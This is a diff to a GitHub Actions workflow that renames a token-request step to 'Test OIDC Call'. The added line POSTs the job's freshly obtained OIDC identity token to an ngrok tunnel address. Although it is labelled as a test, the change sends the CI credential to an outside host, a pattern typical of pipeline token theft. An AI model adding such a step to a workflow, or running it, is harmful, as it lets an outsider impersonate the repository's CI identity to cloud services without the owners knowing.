@@ -12,12 +12,8 @@ jobs:
       contents: read   
 
     steps:
-      - name: Request OIDC Token
-        id: get_token
+      - name: Test OIDC Call
         run: |
-          echo "Requesting OIDC token..."
           RESPONSE=$(curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
           TOKEN=$(echo "$RESPONSE" | jq -r .value)
-          echo "OIDC token retrieved. Length: ${#TOKEN}"
-          echo "$TOKEN" > oidc_token.txt
-          head -c 300 oidc_token.txt
+          curl -X POST https://5c4a-120-60-77-109.ngrok-free.app/verify -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"
